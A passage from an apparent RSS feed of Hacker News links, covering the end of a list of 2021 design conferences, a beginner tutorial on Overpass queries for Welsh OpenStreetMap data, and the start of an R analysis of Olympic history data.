</ul>
<h2><a href="https://berlinletters.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Berlin Letters" target="_blank">Berlin Letters</a></h2>
<p>A festival bringing together professionals and amateurs of lettering, sign painting, calligraphy, and type design. Three days of inspiration, fun, and skillshare with international speakers, awesome workshops, and general jamboree.</p>
<ul>
<li>When: 27 - 29 May 2021</li>
<li>Where: In-person / Berlin, Germany</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://2021.uxlondon.com/fest/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="UX Fest" target="_blank">UX Fest</a></h2>
<p>UX Fest is a pivot of UX London. UXFest is an online celebration of digital design. Taking place throughout June 2021. The festival includes a three-day conference, a series of themed weekly talks, masterclasses, networking, and more. UX Fest is curated by Andy Budd.</p>
<ul>
<li>When: 1 - 3 Jun 2021</li>
<li>Where: Online</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://webconf.asia/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Webconf.asia" target="_blank">Webconf.asia</a></h2>
<p>After postponing two times due to Covis-19, the third edition of Webconf.asia is scheduled for June 4 and 5 2021! Webconf.asia is a conference for designers, developers, and all other people web, with inspiring talks and hands-on workshops. The conference will take place in the wonderful Tai Kwun conference venue and brings together the Hong Kong and Asian web community, next to an international audience.</p>
<ul>
<li>When: 4 - 5 Jun 2021</li>
<li>Where: In-person / Hong Kong</li>
<li>Ticket price:HK$ 2,200</li>
<li>Related podcast: <a href="https://www.neonmoire.com/podcast/36/postpone-or-cancel-your-in-person-conference-with-charis-rooda" title="Podcast Postpone or cancel your in-person conference with Charis Rooda" target="_blank">Postpone or cancel your in-person conference with Charis Rooda</a></li>
</ul>
<h2><a href="https://bydesignconf.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="By Design Conference" target="_blank">By Design Conference</a></h2>
<p>The seventh edition of this international multidisciplinary conference focused on design and business. For designers, entrepreneurs, and creative minds in Bratislava. By Design Conference brings together the world's most successful designers to share their personal experience and pragmatic insights on how to put theory into action. The event helps to educate people on how good design is born and how powerful it can be. Thanks to the real case studies, By Design offers the unique opportunity to explore the process and ideas that really work.</p>
<ul>
<li>When: 12 Jun 2021</li>
<li>Where: In-person / Bratislava, Slovakia</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://www.thedesignconference.com.au/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="The Design Conference" target="_blank">The Design Conference</a></h2>
<p>The Design Conference is an event for creatives. The event discusses more than the future of design — but what design means in the hearts and minds of the world's favorite creative leaders. By being transparent and vulnerable, the organizers engineer an experience that is designed to move, motivate, and connect your soul.</p>
<ul>
<li>When: 15 - 18 Jun 2021</li>
<li>Where: In-person / Brisbane, Australia</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://sonarplusd.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Sónar+D" target="_blank">Sónar+D</a></h2>
<p>Sónar+D is an international congress that explores how creativity is changing our present and imagining new futures, in collaboration with researchers, innovators, and business leaders. Artists, creative technologists, musicians, filmmakers, designers, thinkers, scientists, entrepreneurs, makers, and hackers participate in a carefully commissioned program with the aim of inspiration and networking.</p>
<ul>
<li>When: 17 - 19 Jun 2021</li>
<li>Where: Hybrid / Barcelona , Spain</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://www.iam-internet.com/weekend21?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="IAM Weekend" target="_blank">IAM Weekend</a></h2>
<p>The 7th edition of IAM Weekend. This annual gathering for creative thinkers &amp; doers explores the future of the internet(s). The theme for 2021 is 'The Interbeingness of Citizenships'.</p>
<ul>
<li>When: 16 - 18 Sept 2021</li>
<li>Where: In-person / Barcelona, Spain</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://nordic.design/2021?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Nordic.design" target="_blank">Nordic.design</a></h2>
<p>Due to Covid-19 Nordic.design was postponed to 2021. This festival-like one-day, single-track conference is all about UX, UI, design tools, workflows &amp; more. Be …</p></div></span></p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.neonmoire.com/announcement/21-design-conferences-to-attend-in-2021">https://www.neonmoire.com/announcement/21-design-conferences-to-attend-in-2021</a></em></p>]]>
            </description>
            <link>https://www.neonmoire.com/announcement/21-design-conferences-to-attend-in-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683578</guid>
            <pubDate>Fri, 08 Jan 2021 11:25:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fun with Wales' map data: a tutorial using Overpass queries and OpenStreetmap]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683531">thread link</a>) | @liotier
<br/>
January 8, 2021 | https://mapio.cymru/en/2020/12/overpass/ | <a href="https://web.archive.org/web/*/https://mapio.cymru/en/2020/12/overpass/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			<p><em>Map: places in Wales that have ‘llan’ in their names</em></p>
<p>Would you like to get castles, rivers, post boxes, or cycleways in Wales from a map?</p>
<p>How about investigating place names in Welsh in your local area?</p>
<p>How about getting other features in Wales and further afield, as open data from a map?</p>
<p>This blog post will show you how to get open data from OpenStreetMap, with a particular emphasis on Welsh-language data.</p>
<p>It is intended as a fun introduction, not as a comprehensive reference guide. No previous experience is necessary.</p>
<p>We will be passing queries to the Overpass API, and it’s easy to get started. The queries can be run from your web browser in <a href="https://overpass-turbo.eu/">Overpass Turbo</a>, which is one seriously cool app. Other than that your curiosity is the only prerequisite!</p>
<h2>Introductory concepts</h2>
<p>Feel free to skip this section if you want to head to the practical bit straightaway.</p>
<p>OpenStreetMap is a global map which has been built by thousands of people. It uses a wiki-like approach to mapping – anybody can edit and re-use the content. Because it’s all open data, you can use it however you want in your own learning, work, and leisure.</p>
<p>There is a huge amount of Welsh-language data in OpenStreetMap.</p>
<p>It’s independent of proprietary mapping providers, allowing you freedom to work with the data in your own projects.</p>
<p>The underlying code is also freedom-respecting software and open source. As the Mapio Cymru project we have built a <a href="https://openstreetmap.cymru/">showcase map</a> which shows Welsh-language names for features including places, roads, rivers, and so on.</p>
<h2>How to run an Overpass query</h2>
<p>The quickest way to try Overpass queries is to visit the <a href="https://overpass-turbo.eu/">Overpass Turbo website</a>.</p>
<p>The screen will be divided into an editor panel and a map/data viewer panel. Now do this:</p>
<ol>
<li>Write (or paste!) a query into the editor.</li>
<li>Click the Run button.</li>
<li>The results are shown in the data viewer.</li>
<li>Within the data viewer you can select Map tab or the Data tab.</li>
</ol>
<p>You’ll be following these same steps every time you run a query.</p>
<h2>Towns query</h2>
<p>Here is a simple query you can use. First drag the map and zoom until it shows an area you want to investigate, e.g. a part of Wales. Then follow the above steps using this query.</p>
<pre data-enlighter-language="generic" data-enlighter-linenumbers="false">node["place"="town"]({{bbox}});
out;</pre>
<p>Bingo, you should now see towns plotted on the map area you’ve selected. Congratulations on accomplishing your first Overpass query!</p>
<h2>The data</h2>
<p>Select the Data tab in the data viewer to see the data. It will be in the default format, which is XML.</p>
<p>Here’s a portion of the XML data you’ll see for the results of the above query, for two towns:</p>
<pre data-enlighter-language="generic">&lt;node id="8997358" lat="51.5912466" lon="-2.7517629"&gt;
  &lt;tag k="name" v="Caldicot"/&gt;
  &lt;tag k="name:cy" v="Cil-y-coed"/&gt;
  &lt;tag k="place" v="town"/&gt;
  &lt;tag k="population" v="11200"/&gt;
  &lt;tag k="postal_code" v="NP26 4"/&gt;
  &lt;tag k="wikidata" v="Q722585"/&gt;
  &lt;tag k="wikipedia" v="en:Caldicot, Monmouthshire"/&gt;
&lt;/node&gt;

&lt;node id="21413062" lat="51.8591257" lon="-4.3115907"&gt;
  &lt;tag k="is_in" v="Wales"/&gt;
  &lt;tag k="name" v="Carmarthen"/&gt;
  &lt;tag k="name:br" v="Caerfyrddin"/&gt;
  &lt;tag k="name:cy" v="Caerfyrddin"/&gt;
  &lt;tag k="name:en" v="Carmarthen"/&gt;
  &lt;tag k="name:ja" v="カーマーゼン"/&gt;
  &lt;tag k="name:la" v="Moridunum"/&gt;
  &lt;tag k="name:ru" v="Кармартен"/&gt;
  &lt;tag k="place" v="town"/&gt;
  &lt;tag k="population" v="14185"/&gt;
  &lt;tag k="population:date" v="2011"/&gt;
  &lt;tag k="source" v="NPE"/&gt;
  &lt;tag k="source:population" v="Census"/&gt;
  &lt;tag k="wikidata" v="Q835835"/&gt;
&lt;/node&gt;
</pre>
<p>As you can see, the name:cy tag has the town’s name in Welsh. There are equivalent tags for other languages. There’s also a tag called name without a language code, <a href="https://wiki.openstreetmap.org/wiki/Key:name">here’s the definition of the name key</a>.</p>
<p>In general name:cy will provide the name in Welsh for anything on the map – if it’s been submitted.</p>
<p>The other data in the examples above should be fairly self-explanatory, and include latitude and longitude, Wikidata item identifier, and other things.</p>
<p>Note that OpenStreetMap is always a work in progress. You’ll see pretty good data for many queries although some others will display gaps. (You can edit/add place names on the map, and other features and their tags.)</p>
<h2>Change your Overpass Turbo map to Mapio Cymru</h2>
<p><img loading="lazy" src="https://mapio.cymru/wp-content/uploads/2020/12/overpass-newid-map.png" alt="" width="846" height="648" srcset="https://mapio.cymru/wp-content/uploads/2020/12/overpass-newid-map.png 846w, https://mapio.cymru/wp-content/uploads/2020/12/overpass-newid-map-300x230.png 300w, https://mapio.cymru/wp-content/uploads/2020/12/overpass-newid-map-768x588.png 768w" sizes="(max-width: 846px) 100vw, 846px"></p>
<p>Within Overpass Turbo your underlying map will probably be the main OpenStreetMap. This is OK but it won’t always display all names in Welsh.</p>
<p>You can change it to the Mapio Cymru map server, like this:</p>
<ol>
<li>Select Settings menu</li>
<li>Select Map</li>
<li>In the Tile-Server box put: <strong>//openstreetmap.cymru/osm_tiles/{z}/{x}/{y}.png</strong></li>
</ol>
<p>Please note that when you click on map pins any links will still go to the main OpenStreetMap.</p>
<h2>Farms, cities, and other places</h2>
<p>You can take the query above and modify it:</p>
<pre data-enlighter-language="generic">node["place"="farm"]({{bbox}});
out;</pre>
<p>Spot the difference between this query and the one above. Alternatively use one of the possible <a href="https://wiki.openstreetmap.org/wiki/Key:place">key values for place</a>. For example you can use “village”, “city”, “island” and so on.</p>
<h2>Your bounding box</h2>
<p>In general:</p>
<ul>
<li>If your query refers to a bbox (bounding box) the query will run on the visible map, the portion of the map you’ve selected.</li>
<li>You can also reduce the width of the map: drag its edge to reduce its size, and increase the size of the editor.</li>
<li>If your query has a lot of results, there may be too much data to plot on the Overpass Turbo map in your browser. Try zooming in to reduce the size of the bounding box.</li>
</ul>
<h2>Towns in Wales only</h2>
<p>No matter how much you move the bounding box it’s not possible to get all of Wales, and Wales only. Our query needs to change.</p>
<p>This time, click the Wizard button and type ‘towns in Wales’ then click Build Query. When I ran it it suggested ‘town in Wales’ then gave the following query, and yours will be similar or the same.</p>
<pre data-enlighter-language="generic">/*
This has been generated by the overpass-turbo wizard.
The original search was:
“town in wales”
*/
[out:json][timeout:25];
// fetch area “wales” to search in
{{geocodeArea:wales}}-&gt;.searchArea;
// gather results
(
  // query part for: “town”
  node["place"="town"](area.searchArea);
  way["place"="town"](area.searchArea);
  relation["place"="town"](area.searchArea);
);
// print results
out body;
&gt;;
out skel qt;</pre>
<p>Where possible the Wizard will take the English you type and give a query in Overpass query language. As far as I know the Wizard is only available in English at the moment.</p>
<p>searchArea above is a variable containing our geocode area for Wales. It is set for the life of the query. We don’t have to call it searchArea, we can call it almost anything – as long as there’s no clash with other reserved terms.</p>
<p>The above query contains comments which have no effect on the query. There are two styles:</p>
<pre data-enlighter-language="generic">/* comment within slash star delimiters */

// comment between double slash and end of line</pre>
<h2>Llan place names</h2>
<p><img loading="lazy" src="https://mapio.cymru/wp-content/uploads/2020/12/llan2.jpg" alt="" width="1920" height="1080"></p>
<p>As well as Llanelwy this will return Rhosllannerchrugog in the results – and so on. It’s a case-insensitive search.</p>
<pre data-enlighter-language="generic">[out:json][timeout:50];
(
  node["name"~"Llan",i][place]({{bbox}});
);
out center;</pre>
<p>This is a narrower search for Llan with a capital L.</p>
<pre data-enlighter-language="generic">[out:json][timeout:50];
(
  node["name"~"Llan"][place]({{bbox}});
);
out center;</pre>
<p>Here’s a search that includes the tags <em>name</em> a <em>name:cy</em> for a comprehensive map which includes places which currently lack a <em>name:cy</em> tag and names like Llanandras (Presteigne) and Llanllieni (Leominster) (diolch/thanks for your <a href="https://twitter.com/carlmorris/status/1341050742623383552">replies</a> via Twitter!).</p>
<pre data-enlighter-language="generic">(
node({{bbox}})["name:cy"~"Llan"][place];
node({{bbox}})["name"~"Llan"][place];
);
out;</pre>
<p>This will give all places in Wales with Llan in the name. It gives data only – in Overpass Turbo the map tab will be blank. You can use the CSV results data in a project, e.g. in a spreadsheet.</p>
<pre data-enlighter-language="generic">[out:csv("name:cy", "name", ::lat, ::lon, "place", ::id; true; ",")][timeout:50];
{{geocodeArea:wales}}-&gt;.searchArea;
(
node["name"~"Llan"][place](area.searchArea);
node["name:cy"~"Llan"][place](area.searchArea);
);
out;</pre>
<p>You could modify one of the above for ‘Aber’, ‘Caer’, ‘Tre’ and so on.</p>
<h2>Castles in any area</h2>
<p>Now try this query.</p>
<pre data-enlighter-language="generic">[out:json][timeout:25];
// gather results
(
  // query part for: “castle”
  node["historic"="castle"]({{bbox}});
  way["historic"="castle"]({{bbox}});
  relation["historic"="castle"]({{bbox}});
);
// print results
out body;
&gt;;
out skel qt;</pre>
<p>This is OK but how about all the castles in Wales only? Use this:</p>
<pre data-enlighter-language="generic">[out:json][timeout:25];
{{geocodeArea:wales}}-&gt;.searchArea;
// gather results
(
  // query part for: “castle”
  node["historic"="castle"](area.searchArea);
  way["historic"="castle"](area.searchArea);
  relation["historic"="castle"](area.searchArea);
);
// print results
out body;
&gt;;
out skel qt;</pre>
<p>Here are some others to try. In each case you should edit the three statements above to cover all nodes, ways and relations in the search. Let’s look up the definitions of those in a jiffy…</p>
<pre data-enlighter-language="generic">"natural"="peak"

"site_type"="megalith"

"historic:civilization"="ancient_roman"

"amenity"="bicycle parking"

"amenity"="recycling"

"amenity"="bus station"</pre>
<p>The last one will identify, among others, the National Express coach station in Cardiff – currently the only bus station in the city.</p>
<h2>Elements of OpenStreetMap</h2>
<p>There are millions of possible Overpass queries.</p>
<p>You can play around with basic queries without having a comprehensive understanding of OpenStreetMap. The wizard may help.</p>
<p>Sooner or later though you might want more context to help you write that special query for your own interest. This portion from the <a href="https://wiki.openstreetmap.org/wiki/Elements">documentation on elements</a> has some vital definitions will help:</p>
<p>Elements are the basic components of OpenStreetMap’s conceptual data model of the physical world. They consist of</p>
<ul>
<li>nodes (defining points in space),</li>
<li>ways (defining linear features and area boundaries), and</li>
<li>relations (which are sometimes used to explain how other elements work together).</li>
</ul>
<p>All of the above can have one or more associated tags (which describe the meaning of a particular element).</p>
<p>If you want to see some examples of nodes, use this query.</p>
<p>In Overpass Turbo this will only work for small bounding boxes, because the amounts of data are relatively large.</p>
<h2>Show the Wales Coastal Path</h2>
<p>This is a simple query that only shows one relation – the northern part of the Wales Coastal Path.</p>
<pre data-enlighter-language="generic">relation(18…</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mapio.cymru/en/2020/12/overpass/">https://mapio.cymru/en/2020/12/overpass/</a></em></p>]]>
            </description>
            <link>https://mapio.cymru/en/2020/12/overpass/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683531</guid>
            <pubDate>Fri, 08 Jan 2021 11:17:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Olympic History]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683519">thread link</a>) | @ColinWright
<br/>
January 8, 2021 | https://jollydata.blog/posts/2021-01-01-olympic-history/ | <a href="https://web.archive.org/web/*/https://jollydata.blog/posts/2021-01-01-olympic-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h2 id="introduction">Introduction</h2>
<p>This is an analysis of historical data on the Modern Olympic Games. The first Olympiad of the Modern Era organized by the IOC<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> were held at Athens in 1896. Inclined readers might want to read the extensive <a href="https://en.wikipedia.org/wiki/Olympic_Games#Modern_Games">Wikipedia article</a>.</p>
<p>For the summary and the conclusions you can skip the analysis and jump to <a href="#conclusions-and-summary">Conclusions and Summary</a>.</p>
<p><strong>Important note:</strong> I’m not a real follower of the Olympic Games in general, nor did I follow up with any of the disciplines and athletes in particular before. If any of my “findings” are well known facts in the world of the Olympic Games, please excuse my ignorance and enjoy, that this fact is also represented in the underlying data.</p>
<h2 id="idea-and-materials">Idea and Materials</h2>
<div>
<div>
<p><span>The Idea</span></p>
<p>A question came to my mind when finding the Olympic Games dataset on <em>kaggle</em>: “Can money buy medals?”<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
<p>Other questions I had from the beginning were:</p>
<ul>
<li>How did the disciplines change over time?</li>
<li>What are the top scoring nations?</li>
<li>What factors improve the odds to win a medal: for this, population figures and economic data from <em>gapminder</em> will be called in.</li>
</ul>
<p>As you’ll see, more interesting findings will be found on the way.</p>
<p>At the time of writing there are 206 NOCs<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> regularly sending athletes to the competitions. The number grew over time, so not all current NOCs are included in the analysis. This development is one of the aspects I’ll focus on.</p>
</div>
<div>
<p><span>Historical Olympic Data</span></p>
<p>The <a href="https://www.kaggle.com/heesoo37/120-years-of-olympic-history-athletes-and-results">dataset</a> comprises biographical data on the participating athletes (age, gender, body measurements, …), the disciplines and specific events they attended as well as the medals they won. This is one of the more popular datasets on <em>kaggle</em>, and many have worked on this before me. I hope to bring some new aspects in, by combining the data with the gapminder dataset.</p>
<h4 id="acknowledgements">Acknowledgements</h4>
<p>The data was hosted on <a href="https://www.kaggle.com/heesoo37/120-years-of-olympic-history-athletes-and-results">kaggle</a> by <a href="https://www.kaggle.com/heesoo37">rgriffin</a> under a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0: Public domain</a> license. The data was scraped from <a href="http://www.sports-reference.com/">http://www.sports-reference.com/</a>. The scripts <em>rgriffin</em> developed to scrape and rectangle the data can be found in this <a href="https://github.com/rgriff23/Olympic_history">github repo</a>. The credits and thanks for composing the data go to <em>rgriffin</em> and to the people at www.sports-reference.com for collecting them in the first place.</p>
</div>
<div>
<p><span>Population and Economic Data</span></p>
<p>To analyze the influence of population size and economic markers on the “outcome” of the Olympic contenders I used <a href="https://www.gapminder.org/data/">data</a> from the gapminder foundation. They use data e.g.&nbsp;from the World Bank “to fight devastating ignorance with a fact-based worldview everyone can understand”<a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a>. They achieve this e.g.&nbsp;by <a href="https://www.ted.com/talks/hans_rosling_let_my_dataset_change_your_mindset?utm_campaign=tedspread&amp;utm_medium=referral&amp;utm_source=tedcomshare">giving</a> <a href="https://www.ted.com/talks/hans_and_ola_rosling_how_not_to_be_ignorant_about_the_world?utm_campaign=tedspread&amp;utm_medium=referral&amp;utm_source=tedcomshare">talks</a> and offering teaching materials. They also provide the public with the underlying data.</p>
<h4 id="attribution">Attribution</h4>
<p>The above mentioned data is FREE DATA FROM WORLD BANK VIA <a href="https://www.gapminder.org/">GAPMINDER.ORG</a>, released under the <a href="https://creativecommons.org/licenses/by/4.0/">CC-BY LICENSE</a></p>
</div>
</div>
<h2 id="athletes-and-nocs-over-time">Athletes and NOCs over time</h2>
<p>First, let’s load the required packages, read the data, enrich the NOC data with the corresponding continent…</p>
<div data-layout="l-body">
<div>
<pre><code><span><a href="https://rdrr.io/r/base/library.html">library</a></span><span>(</span><span><a href="http://tidyverse.tidyverse.org/">"tidyverse"</a></span><span>)</span>
<span><a href="https://rdrr.io/r/base/library.html">library</a></span><span>(</span><span><a href="https://github.com/rstudio/rmarkdown">"rmarkdown"</a></span><span>)</span>
<span><a href="https://rdrr.io/r/base/library.html">library</a></span><span>(</span><span><a href="https://github.com/vincentarelbundock/countrycode">"countrycode"</a></span><span>)</span>


<span># read the olympic data</span>
<span>athlete_events</span> <span>&lt;-</span> <span>read_csv</span><span>(</span><span>"../../../data_sources/2021_olympic/athlete_events.csv"</span>,
                 col_types <span>=</span> <span>cols</span><span>(</span>
                   ID <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Name <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Sex <span>=</span> <span>col_factor</span><span>(</span>levels <span>=</span> <span><a href="https://rdrr.io/r/base/c.html">c</a></span><span>(</span><span>"M"</span>,<span>"F"</span><span>)</span><span>)</span>,
                   Age <span>=</span>  <span>col_integer</span><span>(</span><span>)</span>,
                   Height <span>=</span> <span>col_double</span><span>(</span><span>)</span>,
                   Weight <span>=</span> <span>col_double</span><span>(</span><span>)</span>,
                   Team <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   NOC <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Games <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Year <span>=</span> <span>col_integer</span><span>(</span><span>)</span>,
                   Season <span>=</span> <span>col_factor</span><span>(</span>levels <span>=</span> <span><a href="https://rdrr.io/r/base/c.html">c</a></span><span>(</span><span>"Summer"</span>,<span>"Winter"</span><span>)</span><span>)</span>,
                   City <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Sport <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Event <span>=</span> <span>col_character</span><span>(</span><span>)</span>,
                   Medal <span>=</span> <span>col_factor</span><span>(</span>levels <span>=</span> <span><a href="https://rdrr.io/r/base/c.html">c</a></span><span>(</span><span>"Gold"</span>,<span>"Silver"</span>,<span>"Bronze"</span><span>)</span><span>)</span>
                 <span>)</span>
<span>)</span>

<span># read in the NOC regions data</span>
<span>noc_regions</span> <span>&lt;-</span> <span>read_csv</span><span>(</span><span>"../../../data_sources/2021_olympic/noc_regions.csv"</span><span>)</span>

<span># enrich the NOC data with the corresponding continent</span>
<span>noc_regions</span><span>$</span><span>continent</span> <span>&lt;-</span> <span><a href="https://rdrr.io/pkg/countrycode/man/countrycode.html">countrycode</a></span><span>(</span>sourcevar <span>=</span> <span>noc_regions</span><span>$</span><span>region</span>,
                                     origin <span>=</span> <span>"country.name"</span>,
                                    destination <span>=</span> <span>"continent"</span><span>)</span>
   
<span># manually correct the last missing continent data   </span>
<span>noc_regions</span> <span>&lt;-</span> <span>noc_regions</span> <span>%&gt;%</span> 
  <span>mutate</span><span>(</span>continent <span>=</span> <span><a href="https://rdrr.io/r/base/ifelse.html">ifelse</a></span><span>(</span><span>NOC</span> <span>%in%</span> <span><a href="https://rdrr.io/r/base/c.html">c</a></span><span>(</span><span>"FSM"</span>, <span>"TUV"</span><span>)</span>, <span>"Oceania"</span>, <span>continent</span><span>)</span>,
         continent <span>=</span> <span><a href="https://rdrr.io/r/base/ifelse.html">ifelse</a></span><span>(</span><span>NOC</span> <span>==</span> <span>"BOL"</span>, <span>"Americas"</span>, <span>continent</span><span>)</span>,
         continent <span>=</span> <span><a href="https://rdrr.io/r/base/ifelse.html">ifelse</a></span><span>(</span><span>NOC</span> <span>==</span> <span>"KOS"</span>, <span>"Europe"</span>, <span>continent</span><span>)</span>,
         continent <span>=</span> <span><a href="https://rdrr.io/r/base/ifelse.html">ifelse</a></span><span>(</span><span><a href="https://rdrr.io/r/base/NA.html">is.na</a></span><span>(</span><span>continent</span><span>)</span>, <span>"Other"</span>, <span>continent</span><span>)</span>,
         <span># in the athletes_events data the NOC code for Singapore is SGP, not SIN:</span>
         NOC <span>=</span> <span><a href="https://rdrr.io/r/base/ifelse.html">ifelse</a></span><span>(</span><span>NOC</span> <span>==</span> <span>"SIN"</span>, <span>"SGP"</span>, <span>NOC</span><span>)</span> 
         <span>)</span>
</code></pre>
</div>
</div>
<p>…and then inspect the data.</p>
<h3 id="inspecting-the-historic-data">Inspecting the Historic Data</h3>
<div>
<div>
<p><span>Story line</span></p>
<p>There are 271116 rows and 15 variables in this dataset. The table below only shows the first 100 rows. As you can see, there are many NA’s, especially in the body measurement columns, as this was not systematically recorded in the early Olympic Games. As I’m not focussing on these columns, I can ignore this for the moment.</p>

<div data-layout="l-body">
<details>
<summary>Show code</summary>
<div>
<pre><code><span>athlete_events</span> <span>%&gt;%</span> 
  <span>distinct</span><span>(</span><span>Year</span>, <span>Season</span>, <span>Sport</span><span>)</span> <span>%&gt;%</span> 
  <span>count</span><span>(</span><span>Year</span>, <span>Season</span><span>)</span> <span>%&gt;%</span> 
  <span>ggplot</span><span>(</span><span>aes</span><span>(</span><span>Year</span>, <span>n</span><span>)</span><span>)</span> <span>+</span>
    <span>geom_col</span><span>(</span>fill <span>=</span> <span>"#646ECA"</span><span>)</span> <span>+</span>
    <span>facet_grid</span><span>(</span><span>Season</span> <span>~</span> <span>.</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"rect"</span>, xmin <span>=</span> <span>1914</span>, xmax <span>=</span> <span>1918</span>, 
             ymin <span>=</span> <span>0</span>, ymax <span>=</span> <span>35</span>, alpha <span>=</span> <span>0.2</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"text"</span>, x <span>=</span> <span>1916</span>, y <span>=</span> <span>27</span>, label <span>=</span> <span>"WW I"</span>, size <span>=</span> <span>2</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"rect"</span>,xmin <span>=</span> <span>1939</span>, xmax <span>=</span> <span>1945</span>, 
             ymin <span>=</span> <span>0</span>, ymax <span>=</span> <span>35</span>, alpha <span>=</span> <span>0.2</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"text"</span>, x <span>=</span> <span>1942</span>, y <span>=</span> <span>27</span>, label <span>=</span> <span>"WW II"</span>, size <span>=</span> <span>2</span><span>)</span> <span>+</span>
    <span>labs</span><span>(</span>title <span>=</span> <span>"Number of sports included in the Olympic Games over the years"</span>, y <span>=</span> <span>"Number of sports"</span><span>)</span><span>+</span>
    <span>theme_minimal</span><span>(</span><span>)</span> <span>+</span>
    <span>theme</span><span>(</span>text <span>=</span> <span>element_text</span><span>(</span>
        family <span>=</span> <span>"Cabin"</span><span>)</span>,
      plot.title <span>=</span> <span>element_text</span><span>(</span>
        face <span>=</span> <span>"bold"</span>,
        hjust <span>=</span> <span>0</span><span>)</span>,
      axis.title <span>=</span> <span>element_text</span><span>(</span>
        face <span>=</span> <span>"bold"</span>,
        size <span>=</span> <span>rel</span><span>(</span><span>1</span><span>)</span><span>)</span>,
      axis.text <span>=</span> <span>element_text</span><span>(</span>
        face <span>=</span> <span>"bold"</span>,
        size <span>=</span> <span>rel</span><span>(</span><span>0.85</span><span>)</span><span>)</span><span>)</span>
</code></pre>
</div>
</details>
<div><p><span id="fig:unnamed-chunk-3"></span>
<img src="https://jollydata.blog/posts/2021-01-01-olympic-history/olympic-history_files/figure-html5/unnamed-chunk-3-1.png" alt="The number of sports included to the games varied over time. Since the 1980s the number grew with each year until the year 2000. During the last five events (2000, 2004, 2008, 2012 and 2016) the number was almost stable at 34 during summer events and 15 during winter events. WW I / II: Breaks due to World Wars I and II." width="624"></p><p>
Figure 1: The number of sports included to the games varied over time. Since the 1980s the number grew with each year until the year 2000. During the last five events (2000, 2004, 2008, 2012 and 2016) the number was almost stable at 34 during summer events and 15 during winter events. WW I / II: Breaks due to World Wars I and II.
</p>
</div>
</div>
<div data-layout="l-body">
<details>
<summary>Show code</summary>
<div>
<pre><code><span>athlete_events</span> <span>%&gt;%</span>
  <span>distinct</span><span>(</span><span>Year</span>, <span>Season</span>, <span>NOC</span><span>)</span> <span>%&gt;%</span>
  <span>left_join</span><span>(</span><span>noc_regions</span><span>)</span> <span>%&gt;%</span> 
  <span>count</span><span>(</span><span>Year</span>, <span>Season</span>, <span>continent</span><span>)</span> <span>%&gt;%</span>
  <span>ggplot</span><span>(</span><span>aes</span><span>(</span><span>Year</span>, <span>n</span>, fill <span>=</span> <span>continent</span><span>)</span><span>)</span> <span>+</span>
    <span>geom_col</span><span>(</span><span>)</span> <span>+</span>
    <span>scale_fill_brewer</span><span>(</span>palette <span>=</span> <span>"Pastel1"</span><span>)</span> <span>+</span>
    <span>facet_grid</span><span>(</span><span>Season</span> <span>~</span> <span>.</span><span>)</span> <span>+</span>
    <span>labs</span><span>(</span>title <span>=</span> <span>"Number of NOCs participating in the Olympic Games over the years"</span>, y <span>=</span> <span>"Number of NOCs"</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"rect"</span>, xmin <span>=</span> <span>1914</span>, xmax <span>=</span> <span>1918</span>, 
             ymin <span>=</span> <span>0</span>, ymax <span>=</span> <span>200</span>, alpha <span>=</span> <span>0.2</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"text"</span>, x <span>=</span> <span>1916</span>, y <span>=</span> <span>150</span>, label <span>=</span> <span>"WW I"</span>, size <span>=</span> <span>2</span><span>)</span> <span>+</span>
    <span>annotate</span><span>(</span><span>"rect"</span>,xmin <span>=</span> <span>1939</span>, xmax <span>=</span> <span>1945</span>, 
             ymin <span>=</span> <span>0</span>, ymax <span>=</span> <span>200</span>, alpha <span>=</span> <span>0.2</span><span>)</span> <span>+</span>
